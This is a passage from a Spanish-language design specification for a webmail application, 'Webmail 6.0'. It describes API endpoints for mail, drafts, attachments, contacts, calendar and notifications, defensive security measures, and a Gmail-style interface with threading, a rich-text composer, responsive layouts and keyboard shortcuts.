      "uid": 15432,
      "messageId": "<abc123@ejemplo.com>",
      "threadId": "hash_thread_abc",
      "from": { "name": "Remitente", "address": "remitente@ejemplo.com" },
      "to": [{ "name": "Destinatario", "address": "dest@ejemplo.com" }],
      "subject": "Reunión de seguimiento",
      "date": "2026-01-15T10:30:00Z",
      "preview": "Hola, te escribo para confirmar la reunión...",
      "flags": { "seen": true, "answered": false, "flagged": false, "deleted": false, "draft": false },
      "hasAttachments": true,
      "attachmentCount": 2,
      "size": 24580
    }
  ],
  "pagination": {
    "page": 1,
    "limit": 50,
    "total": 1247,
    "hasMore": true
  }
}
```

El endpoint `GET /api/emails/:id/body` implementa el patrón cache-aside: primero consulta Redis, y en miss ejecuta `UID FETCH` con `BODY.PEEK[]` vía imapflow para obtener el mensaje completo, lo parsea con PostalMime para extraer HTML y texto plano, sanitiza el HTML con DOMPurify, y almacena el resultado en Redis con TTL de 3600 segundos [^152^][^99^]. El uso de `BODY.PEEK` evita marcar implícitamente el mensaje como `\Seen`, preservando el estado de lectura hasta que el usuario interactúa explícitamente [^70^][^78^].

El endpoint `GET /api/emails/:id/thread` implementa el algoritmo JWZ (Jamie Zawinski, 1997) para reconstruir conversaciones: busca todos los emails con el mismo `threadId` (un hash determinista del Message-ID raíz del hilo) ordenados por fecha, construyendo el árbol de parent-child mediante los headers `In-Reply-To` y `References` [^56^].

### 6.4 Carpetas

| Método | Path | Descripción | Body Params | Query Params |
|--------|------|-------------|-------------|--------------|
| `GET` | `/api/accounts/:accountId/folders` | Lista carpetas de la cuenta | — | `subscribedOnly?: boolean` (default: false) |
| `POST` | `/api/accounts/:accountId/folders` | Crea nueva carpeta en el servidor IMAP | `name: string`, `parentPath?: string` | — |
| `PATCH` | `/api/accounts/:accountId/folders/:id` | Renombra carpeta o actualiza orden | `name?: string`, `sortOrder?: number`, `subscribed?: boolean` | — |
| `DELETE` | `/api/accounts/:accountId/folders/:id` | Elimina carpeta (y su contenido si está vacía) | — | `force?: boolean` (default: false) |
| `POST` | `/api/accounts/:accountId/folders/:id/empty` | Vacía carpeta (elimina todos los mensajes) | — | — |

Las operaciones de creación, renombrado y eliminación de carpetas se ejecutan directamente contra el servidor IMAP mediante los comandos IMAP CREATE, RENAME y DELETE, respectivamente. Tras una operación exitosa, se invalida el cache local de folders y se ejecuta una sincronización de la jerarquía [^1^].

### 6.5 Composición y Envío

| Método | Path | Descripción | Body Params | Query Params |
|--------|------|-------------|-------------|--------------|
| `GET` | `/api/drafts` | Lista borradores del usuario | — | `accountId?: string` |
| `GET` | `/api/drafts/:id` | Obtiene un borrador específico | — | — |
| `POST` | `/api/drafts` | Crea un nuevo borrador | `accountId: string`, `to?: Address[]`, `cc?: Address[]`, `bcc?: Address[]`, `subject?: string`, `bodyHtml?: string`, `bodyText?: string` | — |
| `PATCH` | `/api/drafts/:id` | Actualiza borrador (auto-save) | `to?: Address[]`, `cc?: Address[]`, `bcc?: Address[]`, `subject?: string`, `bodyHtml?: string`, `bodyText?: string`, `attachments?: DraftAttachment[]` | — |
| `DELETE` | `/api/drafts/:id` | Elimina borrador | — | — |
| `POST` | `/api/drafts/:id/send` | Envía borrador (SMTP → copia en Sent → borra draft) | `includeSignature?: boolean` | — |
| `POST` | `/api/send` | Envío directo sin crear borrador previo | `accountId: string`, `to: Address[]`, `cc?: Address[]`, `bcc?: Address[]`, `subject: string`, `bodyHtml?: string`, `bodyText?: string`, `attachments?: string[]` (storageKeys), `replyTo?: ReplyToConfig`, `includeSignature?: boolean` | — |

**Ejemplo de envío directo:**

```typescript
// Request POST /api/send
{
  "accountId": "507f1f77bcf86cd799439012",
  "to": [{ "name": "Destinatario", "address": "dest@empresa.com" }],
  "cc": [{ "address": "copia@empresa.com" }],
  "subject": "Propuesta de colaboración",
  "bodyHtml": "<p>Estimado equipo,</p><p>Adjunto nuestra propuesta...</p>",
  "bodyText": "Estimado equipo, Adjunto nuestra propuesta...",
  "attachments": ["sw://accounts/123/attachments/file.pdf"],
  "replyTo": {
    "emailId": "507f1f77bcf86cd799439020",
    "messageId": "<original@email.com>",
    "references": ["<root@thread.com>", "<original@email.com>"]
  },
  "includeSignature": true
}
```

El pipeline de envío implementa una transacción distribuida con compensación: (1) Nodemailer transmite el mensaje vía SMTP con pooling de conexiones y STARTTLS [^68^]; (2) tras confirmación `250 OK`, se copia en la carpeta Sent vía IMAP APPEND con los flags apropiados [^60^]; (3) se elimina el draft de MongoDB; (4) se encola un job para indexar el mensaje enviado. Si el paso 2 falla, se encola un retry en BullMQ con exponential backoff; si el paso 1 falla, se marca el draft como `status: 'failed'` y se notifica al usuario [^203^].

Para cuentas Gmail, el envío SMTP requiere autenticación OAuth2 (XOAUTH2) ya que Google eliminó completamente la autenticación básica en marzo de 2025 [^58^]. Microsoft depreca Basic Authentication para Exchange Online con deadline de abril de 2026 [^59^]. imapflow y Nodemailer soportan autenticación vía `accessToken` como alternativa a password [^41^].

### 6.6 Adjuntos

| Método | Path | Descripción | Body Params | Query Params |
|--------|------|-------------|-------------|--------------|
| `POST` | `/api/attachments/upload` | Sube archivo adjunto temporal | `file: multipart/form-data` | `draftId?: string` |
| `GET` | `/api/attachments/:storageKey` | Descarga archivo adjunto | — | `download?: boolean` (force download vs inline) |
| `GET` | `/api/attachments/:storageKey/preview` | Obtiene preview del adjunto (imágenes, PDFs) | — | `width?: number`, `height?: number` |
| `DELETE` | `/api/attachments/:storageKey` | Elimina archivo adjunto | — | — |

Los archivos adjuntos se almacenan en SeaweedFS, seleccionado como alternativa a MinIO tras el archivo de su edición comunitaria en febrero de 2026. SeaweedFS ofrece licencia Apache 2.0 y está especialmente optimizado para escenarios de alto I/O con muchos archivos pequeños — el patrón típico de attachments de email [^177^]. La metadata de cada adjunto (nombre, MIME type, tamaño, storageKey) se registra en la colección MongoDB `attachments` mientras el contenido binario reside en SeaweedFS.

El endpoint de upload acepta archivos mediante `multipart/form-data` con un límite de 25MB por archivo. Los archivos se validan contra una lista de tipos MIME permitidos y se escanean con ClamAV antes del almacenamiento definitivo. El `storageKey` generado sigue la convención `{userId}/{timestamp}_{hash}.{ext}` para evitar colisiones.

### 6.7 Contactos

| Método | Path | Descripción | Body Params | Query Params |
|--------|------|-------------|-------------|--------------|
| `GET` | `/api/contacts` | Lista contactos del usuario | — | `query?: string` (búsqueda), `limit?: number` (default: 50), `offset?: number`, `sort?: 'name' \| 'recent' \| 'frequent'` (default: 'name') |
| `GET` | `/api/contacts/autocomplete` | Autocomplete para compositor (sub-50ms) | — | `q: string` (mínimo 2 caracteres), `limit?: number` (default: 5) |
| `GET` | `/api/contacts/:id` | Obtiene contacto por ID | — | — |
| `POST` | `/api/contacts` | Crea nuevo contacto | `fullName: string`, `email: string`, `phones?: Phone[]`, `organization?: string`, `jobTitle?: string`, `notes?: string`, `birthday?: string` | — |
| `PATCH` | `/api/contacts/:id` | Actualiza contacto | Campos parciales de contacto | — |
| `DELETE` | `/api/contacts/:id` | Elimina contacto | — | — |
| `POST` | `/api/contacts/import` | Importa contactos desde vCard (.vcf) | `file: multipart/form-data` | — |
| `GET` | `/api/contacts/export` | Exporta contactos a vCard (.vcf) | — | — |
| `POST` | `/api/contacts/sync` | Sincroniza contactos con servidor CardDAV | — | `force?: boolean` (default: false) |

El endpoint `GET /api/contacts/autocomplete` está optimizado para latencia sub-50ms: consulta únicamente contactos con `isFrequent: true` ordenados por `usageCount` descendente, utilizando el índice compuesto `{userId: 1, isFrequent: -1, usageCount: -1}`. Si no hay suficientes resultados entre los contactos frecuentes, expande la búsqueda al resto de contactos ordenados alfabéticamente. Los resultados se cachean en Redis con TTL de 5 minutos por prefijo de búsqueda.

La sincronización CardDAV vía tsdav utiliza ETags para detección de cambios concurrentes y sync-tokens para sincronización incremental, resolviendo conflictos a nivel de campo para minimizar pérdida de datos [^226^][^190^].

### 6.8 Calendario

| Método | Path | Descripción | Body Params | Query Params |
|--------|------|-------------|-------------|--------------|
| `GET` | `/api/calendars` | Lista calendarios disponibles | — | `accountId?: string` |
| `GET` | `/api/calendars/:calendarId/events` | Lista eventos de un calendario | — | `start: string` (ISO 8601), `end: string` (ISO 8601), `includeRecurring?: boolean` (default: true) |
| `GET` | `/api/calendars/events/:id` | Obtiene detalle de un evento | — | — |
| `POST` | `/api/calendars/:calendarId/events` | Crea nuevo evento | `summary: string`, `startDate: string`, `endDate: string`, `startTimezone: string`, `description?: string`, `location?: string`, `allDay?: boolean`, `recurrenceRule?: string`, `attendees?: Attendee[]`, `alarm?: AlarmConfig` | — |
| `PATCH` | `/api/calendars/events/:id` | Actualiza evento | Campos parciales de evento | — |
| `DELETE` | `/api/calendars/events/:id` | Elimina evento | — | `cancel?: boolean` (envía cancelación iTip) |
| `POST` | `/api/calendars/events/:id/respond` | Responde a invitación (aceptar/declinar/tentativo) | `status: 'accepted' \| 'declined' \| 'tentative'`, `comment?: string` | — |
| `POST` | `/api/calendars/sync` | Sincroniza calendarios vía CalDAV | — | `accountId?: string`, `force?: boolean` (default: false) |
| `GET` | `/api/calendars/events/:id/ics` | Descarga evento como archivo .ics | — | — |
| `POST` | `/api/emails/:emailId/ics/import` | Importa evento desde adjunto .ics de email | — | — |

**Ejemplo de response para eventos de calendario:**

```typescript
// Response GET /api/calendars/:calendarId/events?start=2026-01-01&end=2026-01-31
{
  "events": [
    {
      "id": "507f1f77bcf86cd799439050",
      "uid": "event-uid-123@ejemplo.com",
      "summary": "Reunión de planificación Q1",
      "description": "Revisión de objetivos trimestrales",
      "location": "Sala de conferencias A",
      "startDate": "2026-01-20T14:00:00Z",
      "startTimezone": "America/Mexico_City",
      "endDate": "2026-01-20T15:30:00Z",
      "endTimezone": "America/Mexico_City",
      "allDay": false,
      "organizer": { "name": "Organizador", "email": "org@empresa.com" },
      "attendees": [
        { "name": "Participante 1", "email": "p1@empresa.com", "status": "accepted", "role": "required" },
        { "name": "Participante 2", "email": "p2@empresa.com", "status": "needs-action", "role": "required" }
      ],
      "alarm": { "triggerMinutes": 15, "method": "display" },
      "status": "confirmed",
      "calendarName": "Trabajo",
      "calendarColor": "#4285f4"
    }
  ]
}
```

El endpoint `POST /api/emails/:emailId/ics/import` parsea el adjunto .ics del email usando ical.js, la librería estándar de Mozilla para parsing/generación de iCalendar (RFC 5545), y crea un evento en la colección `events` vinculado al email fuente [^197^]. El usuario puede aceptar o declinar la invitación directamente desde la vista del email, y el sistema envía la respuesta iTip (RFC 5546) al organizador vía el servidor CalDAV usando tsdav [^190^].

El manejo de timezones utiliza la base de datos IANA para conversiones, almacenando las fechas en UTC internamente y aplicando la zona horaria del usuario solo en el momento de renderizado. Esta estrategia evita los bugs recurrentes causados por definiciones VTIMEZONE inconsistentes entre clientes, especialmente Outlook [^155^][^156^].

### 6.9 Notificaciones en Tiempo Real

Aunque la mayoría de las operaciones siguen el modelo request/response REST, las notificaciones push de nuevos emails utilizan WebSocket sobre Socket.IO para entrega en tiempo real.

| Evento WS | Dirección | Payload | Descripción |
|-----------|-----------|---------|-------------|
| `email:new` | Server → Client | `{accountId, folderId, email: EmailHeader, unseenCount}` | Nuevo email recibido |
| `email:flagChanged` | Server → Client | `{accountId, emailId, flags: EmailFlags}` | Flags modificados (leído, destacado) |
| `folder:countChanged` | Server → Client | `{accountId, folderId, totalMessages, unseenMessages}` | Contadores actualizados |
| `draft:saved` | Server → Client | `{draftId, savedAt}` | Confirmación de auto-save |
| `sync:completed` | Server → Client | `{accountId, folderId, added, updated, deleted}` | Sincronización completada |
| `sync:error` | Server → Client | `{accountId, error: string}` | Error en sincronización |
| `calendar:eventUpdated` | Server → Client | `{calendarId, eventId, type: 'created' \| 'updated' \| 'deleted'}` | Cambio en calendario |

El pipeline de notificaciones sigue la arquitectura: IMAP IDLE detecta cambio → IMAP Manager publica evento a Redis Pub/Sub en canal `notifications:{userId}` → Socket.IO server (suscrito al canal) recibe evento y retransmite a la room del usuario [^138^][^139^][^162^]. Si WebSocket no está disponible, el frontend transita transparentemente a polling adaptativo de 30-60 segundos usando el comando IMAP STATUS para comparar `UIDNEXT` y `UNSEEN` con valores cacheados [^41^].

### 6.10 Rate Limiting y Seguridad

Todos los endpoints están protegidos por rate limiting basado en el algoritmo Sliding Window implementado con Redis Sorted Sets (ZSET) [^156^][^158^]. La configuración por endpoint varía según su sensibilidad y costo computacional:

| Endpoint | Ventana | Límite | Justificación |
|----------|---------|--------|---------------|
| `POST /api/auth/login` | 15 min | 5 intentos | Prevenir fuerza bruta contra credenciales |
| `POST /api/auth/refresh` | 15 min | 10 intentos | Limitar rotación de tokens |
| `POST /api/accounts` | 1 hora | 10 creaciones | Prevenir spam de cuentas |
| `POST /api/accounts/:id/sync` | 5 min | 3 sincronizaciones | Evitar sobrecarga de servidores IMAP |
| `POST /api/send` | 1 min | 10 envíos | Limitar spam saliente |
| `POST /api/attachments/upload` | 1 hora | 50 uploads (1GB) | Control de uso de storage |
| `GET /api/accounts/*/emails` | 1 min | 120 requests | Proteger listados frecuentes |
| `PATCH /api/drafts/*` | 1 min | 30 requests | Auto-save frecuente pero limitado |

El rate limiting se implementa mediante `ZREMRANGEBYSCORE` para eliminar timestamps viejos seguido de `ZCARD` para contar requests en la ventana actual, ofreciendo precisión de nivel de request sin el "burst effect" de los límites de ventana fija [^156^].

La validación de inputs en todos los endpoints utiliza los JSON Schema nativos de Fastify, que compilan los schemas en funciones de validación optimizadas en tiempo de arranque. Los schemas de request definen: tipos de datos, rangos numéricos, patrones regex para emails (RFC 5322), y campos requeridos. Los schemas de response garantizan que solo los campos definidos se serializan, previniendo filtración accidental de datos sensibles (como `authCredentials` en las responses de accounts, que se excluye explícitamente mediante el schema de response) [^130^].

Los headers de seguridad se configuran globalmente en Fastify: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Strict-Transport-Security: max-age=31536000; includeSubDomains`, y una Content Security Policy estricta que bloquea scripts inline, eval, y contenido de orígenes no whitelisteados. Estas cabeceras complementan la sanitización HTML de DOMPurify y el iframe sandbox para renderizado de emails, formando una estrategia defense-in-depth contra vectores XSS [^154^].


---

## 7. Diseño UI/UX: Gmail-Style

La decisión de UX con mayor impacto en Webmail 6.0 es la adopción del layout de tres paneles de Gmail con conversation threading, pues constituye lo que los usuarios esperan de un cliente de correo moderno [^101^]. Gmail fue diseñado intencionalmente para la "simplicidad gozosa" — el diseñador Kevin Fox buscaba "la alegría de la confianza", donde la interfase no interfiere, haciendo las interacciones sin fricción [^13^]. Webmail 6.0 replica este enfoque mediante un layout de tres paneles responsivo, vista de conversaciones con el algoritmo JWZ, un editor WYSIWYG basado en Tiptap 2, atajos de teclado estilo Gmail y virtual scrolling para listas grandes.

### 7.1 Layout de Tres Paneles

El layout de tres paneles es el estándar de facto para interfaces de webmail: la barra lateral izquierda sirve como navegación primaria con carpetas y etiquetas, el panel central muestra la lista de correos en vista de conversación, y el panel derecho de lectura (reading pane) muestra el contenido completo del mensaje seleccionado sin navegar away [^101^]. Este diseño evolucionó desde la interfase de panel único de 2004 hasta la estructura multi-panel actual, con el Preview Pane introducido vía Gmail Labs en 2011 hasta convertirse en opción estándar [^101^].

#### 7.1.1 Sidebar Izquierda

El sidebar izquierda tiene un ancho fijo de 256px en desktop y contiene cuatro secciones principales: selector de cuentas, árbol de carpetas/etiquetas, acceso rápido al calendario, y contactos. El selector de cuentas emplea un componente `<select>` estilizado de Headless UI (`@headlessui/vue`) con transición animada entre cuentas [^49^]. El árbol de carpetas implementa un componente Tree de Radix Vue con soporte WAI-ARIA para navegación por teclado, expandir/colapsar carpetas anidadas, y drag-and-drop para reordenar carpetas personalizadas [^125^].

Cada carpeta en el árbol muestra tres elementos: nombre de carpeta, contador de mensajes no leídos (badge circular con fondo rojo `#EA4335` y texto blanco), e icono de estado de sincronización. Las carpetas del sistema —Inbox, Sent, Drafts, Trash, Spam— utilizan iconos de Heroicons (24×24px, stroke 1.5px) en color gris `#5F6368`. Las carpetas personalizadas muestran un icono de carpeta con color configurable por el usuario seleccionado de una paleta de 18 colores predefinidos.

La sección de calendario en el sidebar muestra un mini-calendario mensual (180×180px) construido con `@fullcalendar/core` en modo `dayGrid` sin header, con eventos representados como puntos de color bajo cada fecha. Un clic en cualquier fecha navega al módulo de calendario con esa fecha seleccionada.

#### 7.1.2 Panel Central: Lista de Emails

El panel central ocupa el espacio restante entre el sidebar (256px) y el reading pane (40% del ancho restante en desktop). Implementa virtual scrolling mediante el composable `useVirtualList` de VueUse, que renderiza únicamente los items visibles y mejora drásticamente el rendimiento para listas con miles de elementos [^106^]. La investigación demuestra que el virtual scrolling reduce el tiempo de renderizado a menos de 20ms por ítem y mantiene tasas de cuadro superiores a 60fps para listas con más de 1,000 elementos [^106^][^107^].

Cada fila de email tiene una altura variable de 72px (mensaje no expandido) a 140px (con snippet de preview), con los siguientes elementos dispuestos en grid de 4 columnas: checkbox de selección (16×16px, borde `#DADCE0`), estrella de importancia (20×20px, toggle amarilla `#F4B400` / gris vacía), remitente (fuente 14px, weight 500, truncado a 30 caracteres), y timestamp (12px, color `#5F6368`, formato relativo: "hace 2h" para <24h, fecha corta para mensajes antiguos).

La selección múltiple sigue el patrón de Gmail: click con Ctrl/Cmd añade a la selección, Shift+click selecciona el rango, y la barra de acciones flotante aparece en la parte inferior del panel central cuando hay múltiples items seleccionados. La barra de acciones contiene botones para: archivar (icono archivo), eliminar (icono basura), marcar como leído/no leído, y mover a carpeta (dropdown).

Los badges de estado se renderizan como pills redondeadas (radio 12px) con los siguientes colores: no leído (fondo blanco, borde izquierdo azul `#1A73E8` de 3px), importante (estrella `#F4B400`), y etiquetas personalizadas (colores configurables del usuario).

#### 7.1.3 Panel Derecho: Reading Pane

El reading pane tiene un ancho de 40% del viewport en desktop (mínimo 400px, máximo 680px) y muestra el contenido del email seleccionado. Consta de dos secciones: el header del mensaje (remitente, destinatarios, asunto, fecha, acciones) y el cuerpo del mensaje.

El cuerpo del mensaje se renderiza dentro de un iframe aislado (`sandbox="allow-same-origin"`) para mitigar riesgos de XSS. El HTML del email se sanitiza en el servidor con DOMPurify antes de almacenarse, configurando tags permitidos (`p`, `br`, `strong`, `em`, `a`, `ul`, `ol`, `li`, `img`, `blockquote`, `pre`, `code`, `table`, `tr`, `td`) y atributos (`href`, `src`, `alt`, `title`, `class`) [^68^][^70^]. El iframe tiene un CSP estricto: `default-src 'none'; style-src 'unsafe-inline'`. Un toggle en la parte superior del reading pane permite cambiar entre vista HTML renderizada y vista de texto plano (extraído del campo `text/plain` del MIME o generado mediante `html-to-text` como fallback).

El modo texto plano renderiza el contenido en una fuente monoespaciada (Roboto Mono, 13px, color `#202124`, línea de 1.5) con citas anidadas indentadas por prefijo `>`. Los enlaces en texto plano se detectan mediante expresión regular y se convierten a elementos `<a>` clicables con `target="_blank"`.

### 7.2 Vista de Conversaciones (Threading)

La vista de conversaciones es la innovación de UX más característica de Gmail — la idea de diseño fue que "el valor de tener toda una conversación en un lugar superó con creces cualquier confusión menor por casos borde" [^13^]. Gmail apila los mensajes con avances (peeks) para cada mensaje, el más reciente arriba, con dos cosas siempre visibles: el mensaje no leído más nuevo y una referencia a otros mensajes en el hilo [^13^]. Este patrón ha sido adoptado por Outlook, Thunderbird y ProtonMail [^12^].

#### 7.2.1 Algoritmo JWZ

Para servidores IMAP genéricos, Webmail 6.0 implementa el algoritmo JWZ de Jamie Zawinski para agrupar mensajes en conversaciones. El algoritmo examina tres cabeceras MIME: `Message-ID` (identificador único del mensaje), `In-Reply-To` (referencia al mensaje padre), y `References` (lista de IDs de mensajes en el hilo). El proceso construye un grafo dirigido donde cada nodo es un mensaje y las aristas representan relaciones padre-hijo. Mensajes huérfanos (sin referencias coincidentes) se agrupan adicionalmente por coincidencia de asunto normalizado (eliminando prefijos tipo `Re:`, `Fw:`, `Fwd:`).

La implementación procesa los mensajes en tres pasadas: primera pasada indexa todos los `Message-ID`, segunda pasada conecta aristas `In-Reply-To` y `References`, tercera pasada agrupa huérfanos por asunto. La complejidad es O(n) donde n es el número de mensajes en la carpeta, ejecutándose en el cliente sobre los headers ya cacheados en MongoDB.

#### 7.2.2 Gmail threadId Nativo

Para cuentas Gmail vía IMAP, Webmail 6.0 aprovecha la cabecera personalizada `X-GM-THRID` que proporciona un identificador de hilo nativo de 64 bits. Esto elimina la necesidad del algoritmo JZW para Gmail, ya que el servidor ya ha realizado el agrupamiento. La capa de abstracción de protocolo detecta automáticamente si la cuenta es Gmail (mediante `X-GM-EXT-1` en la respuesta `CAPABILITY`) y utiliza `threadId` nativo cuando está disponible, cayendo a JWZ para servidores IMAP genéricos.

#### 7.2.3 Vista Apilada

En el panel de lista, cada conversación se renderiza como una sola fila con el asunto como título, la lista de participantes truncada a los primeros 3 nombres + contador de mensajes restantes, y el snippet del mensaje más reciente. El badge de conteo de mensajes es un círculo de 20px con fondo gris `#E8EAED` y texto `#5F6368`.

Al abrir una conversación, el reading pane muestra los mensajes apilados verticalmente: los mensajes antiguos aparecen colapsados mostrando solo remitente, primeras 120 caracteres del cuerpo, y timestamp. El mensaje más reciente siempre se renderiza expandido. Cada mensaje colapsado tiene una altura de 48px con un gradiente sutil de fondo que simula apilamiento físico. Un clic expande el mensaje, animado con transición CSS de 200ms ease-out. Un botón "Expandir todos" en el header de la conversación expande simultáneamente todos los mensajes del hilo.

### 7.3 Composer

#### 7.3.1 Tiptap 2 Editor WYSIWYG

El editor de composición se basa en Tiptap 2 (ProseMirror), integrado nativamente con Vue 3 vía el paquete `@tiptap/vue-3` con el composable `useEditor` y soporte para sintaxis `<script setup>` [^46^]. La barra de herramientas flota sobre el editor con botones para: negrita, itálica, lista ordenada, lista desordenada, enlace (con diálogo de URL), cita en bloque, y adjuntar archivos.

La configuración de Tiptap incluye las extensiones: `StarterKit`, `Link` (con autolink habilitado), `Placeholder` (configurado con el texto "Escribe tu mensaje..."), y `History` (undo/redo nativo). El editor ocupa el 100% del ancho del contenedor con un área de texto de altura mínima 200px y máxima 600px (scroll vertical), borde de 1px `#DADCE0`, radio de esquina 8px, y padding de 16px.

Dado que ProseMirror tiene vulnerabilidades XSS documentadas en DOMSerializer cuando los atributos de nodo no se validan adecuadamente, todo HTML producido por Tiptap se sanitiza con DOMPurify antes de almacenar o enviar, configurando tags permitidos (`p`, `br`, `strong`, `em`, `a`, `ul`, `ol`, `li`) y atributos (`href`), prohibiendo explícitamente `script`, `style`, `iframe` y atributos de manejadores de eventos [^64^][^68^][^69^].

#### 7.3.2 Auto-save cada 10 Segundos

El compositor implementa auto-save con debounce de 10 segundos usando `setInterval`. En cada ciclo, si el contenido ha cambiado desde el último guardado, el draft se envía al backend vía endpoint `POST /api/drafts` con el payload: `{ accountId, threadId, to, cc, bcc, subject, bodyHtml, bodyText, attachments }`. Un indicador visual en la esquina inferior izquierda muestra tres estados: "Guardando..." (puntos animados), "Guardado" (checkmark verde `#34A853` con timestamp), y "Error al guardar" (icono de alerta `#EA4335` con opción de reintentar).

Los drafts se almacenan en MongoDB con TTL de 30 días. La recuperación de draft interrumpido funciona mediante detección de drafts no enviados al cargar el compositor — si existe un draft en progreso para la cuenta activa, se muestra un toast con opción de restaurar o descartar.

#### 7.3.3 Adjuntos: Drag-and-Drop, Preview Thumbnails, Límite 25MB

La zona de adjuntos soporta dos métodos de entrada: drag-and-drop y selección manual mediante input file. El área de drop es un contenedor de mínimo 200×100px con borde discontinuo 2px `#DADCE0` que cambia a borde sólido azul `#1A73E8` durante el arrastre activo [^103^][^104^]. Los archivos se validan client-side antes de upload: tamaño máximo 25MB por archivo (límite de Gmail), tipos permitidos (lista blanca de 50 extensiones comunes), y escaneo de tipo MIME real vía magic numbers.

Una vez adjuntados, cada archivo se muestra como una tarjeta de preview de 120×80px con: icono/thumbnail (imágenes muestran thumbnail generado con canvas, otros archivos muestran icono de tipo), nombre truncado a 20 caracteres, tamaño formateado (KB/MB), y botón de eliminar (×). Para imágenes, el thumbnail se genera con `URL.createObjectURL` y redimensionamiento a 120×80px vía `<canvas>`. El progreso de upload se visualiza como barra horizontal sobre cada tarjeta, animada con transición CSS width.

#### 7.3.4 Reply/Reply-all/Forward con Quote

Los modos de respuesta implementan tres variantes: Reply (responde al remitente), Reply-all (añade CC a todos los destinatarios del hilo), y Forward (reenvía el mensaje completo con adjuntos originales). En Reply y Reply-all, el cuerpo del mensaje original se inserta como cita en bloque al final del editor, precedido por la línea de atribución: "El día {fecha}, {nombre_remitente} escribió:". La cita se renderiza con borde izquierdo gris `#DADCE0` de 2px, padding izquierdo 8px, y color de texto `#5F6368`.

En Forward, el asunto se prefija automáticamente con "Fwd: " (si no existe ya). El cuerpo incluye el mensaje original completo como cita y los adjuntos originales se ofrecen como "Adjuntos en línea" que el usuario puede incluir o descartar individualmente.

#### 7.3.5 Firmas Configurables por Cuenta

Cada cuenta de correo puede tener una firma configurable HTML (editada con un Tiptap inline de una sola línea) y una versión texto plano auto-generada. La firma se inserta automáticamente al final del cuerpo del mensaje en modo composición, separada por dos guiones y un salto de línea (`-- \n`, convención de firma de correo). Las firmas se almacenan en la configuración de cuenta en MongoDB y se pueden desactivar globalmente o por mensaje mediante un checkbox "Incluir firma".

### 7.4 Responsive Design

El diseño responsive para clientes de correo debe manejar tres breakpoints clave: <480px (móvil, columna única), 481-768px (tabletas), y 769px+ (desktop, multi-panel). En 2025, más del 70% de las aperturas de correo ocurren en dispositivos móviles [^44^][^45^].

#### 7.4.1 Desktop (769px+)

En desktop, los tres paneles se visualizan simultáneamente: sidebar izquierda (256px, colapsable a 72px de iconos solo), panel central de lista (variable), y reading pane derecho (40% del espacio restante). La separación entre paneles es arrastrable (drag handle de 4px con cursor `col-resize`), permitiendo al usuario ajustar los anchos. Los valores de ancho se persisten en `localStorage` y se restauran en sesiones posteriores.

#### 7.4.2 Tablet (481-768px)

En tablet, el sidebar se colapsa automáticamente al modo icono (72px de ancho) mostrando solo los iconos de las carpetas sin texto. Un botón de hamburguesa en la esquina superior izquierda expande el sidebar completo como overlay de 256px sobre el panel central con backdrop oscurecido (`rgba(0,0,0,0.5)`). El reading pane se ocupa el 60% del viewport cuando está activo, deslizándose desde la derecha sobre el panel central con transición de 300ms ease-in-out. La lista de emails muestra solo remitente, asunto truncado y timestamp.

#### 7.4.3 Mobile (<480px)

En móvil, la aplicación adopta una vista apilada de tres niveles: Nivel 1 (sidebar como menú hamburger que ocupa pantalla completa), Nivel 2 (lista de emails a pantalla completa con barra de búsqueda fija en la parte superior), y Nivel 3 (reading pane que se abre como pantalla completa con botón de retroceso). La navegación entre niveles usa transiciones de slide horizontal (300ms, easing `cubic-bezier(0.4, 0, 0.2, 1)`). Los tap targets tienen un mínimo de 44-48px de altura [^44^] y la fuente base es de 16px para evitar zoom automático de inputs en iOS.

### 7.5 Keyboard Shortcuts (Gmail-style)

Webmail 6.0 implementa atajos de teclado estilo Gmail mediante un composable `useKeyboardShortcuts` que escucha eventos `keydown` a nivel de `document`. El composable implementa un sistema de secuencias: la tecla `g` activa un modo "goto" que espera una segunda tecla (navegación), mientras que las teclas individuales ejecutan acciones inmediatas. El sistema evita interceptar cuando el foco está en un input, textarea o el editor Tiptap.

| Atajo | Acción | Descripción |
|-------|--------|-------------|
| `g` then `i` | Ir a Inbox | Navega a la carpeta de entrada |
| `g` then `s` | Ir a Enviados | Navega a la carpeta de mensajes enviados |
| `g` then `d` | Ir a Borradores | Navega a la carpeta de drafts |
| `g` then `c` | Ir a Calendario | Cambia al módulo de calendario |
| `g` then `t` | Ir a Papelera | Navega a la papelera |
| `g` then `a` | Ir a Todos | Muestra todos los mensajes |
| `c` | Componer | Abre ventana de nuevo mensaje |
| `r` | Responder | Responde al mensaje seleccionado |
| `a` | Responder a todos | Reply-all al hilo activo |
| `f` | Reenviar | Forward del mensaje seleccionado |
| `/` | Buscar | Enfoca la barra de búsqueda global |
| `e` | Archivar | Mueve el email a la carpeta de archivo |
| `#` | Eliminar | Mueve el email a la papelera |
| `!` | Spam | Marca el email como spam |
| `u` | Ir arriba | Selecciona el mensaje anterior en la lista |
| `j` | Ir abajo | Selecciona el mensaje siguiente en la lista |
| `k` | Ir arriba (alt) | Alias de `u`, compatible con Gmail |
| `n` | Siguiente | Abre el siguiente mensaje en el reading pane |
| `p` | Anterior | Abre el mensaje anterior en el reading pane |
| `o` o `Enter` | Abrir | Abre el mensaje seleccionado en reading pane |
| `m` | Silenciar | Archiva y silencia notificaciones del hilo |
| `v` | Mover a | Abre diálogo para seleccionar carpeta destino |
| `l` | Etiquetar | Abre diálogo para añadir/quitar etiquetas |
| `s` | Estrella | Marca/desmarca con estrella el mensaje seleccionado |
| `?` | Ayuda | Muestra modal con referencia de todos los atajos |
| `Esc` | Cerrar | Cierra modal, composer, o deselecciona mensajes |

La implementación del composable `useKeyboardShortcuts` utiliza una máquina de estados simple con dos modos: `IDLE` (esperando atajo directo) y `GOTO` (la tecla `g` fue presionada, esperando segunda tecla). El timeout entre teclas de secuencia es de 1,500ms; si no se presiona una segunda tecla válida, el estado vuelve a `IDLE`. El sistema detecta automáticamente el contexto activo (lista de emails, reading pane, composer, calendario) y ejecuta solo los atajos válidos para ese contexto. Por ejemplo, `r` para reply solo funciona cuando hay un mensaje seleccionado en el reading pane.

El modal de ayuda (`?`) muestra una tabla organizada por categorías —Navegación, Acción, Selección— con las teclas destacadas en badges de estilo teclado (fondo `#F1F3F4`, borde `#DADCE0`, sombra inferior 2px, radio 4px, fuente monospace 13px). El modal se cierra con `Esc` o clic en el backdrop.

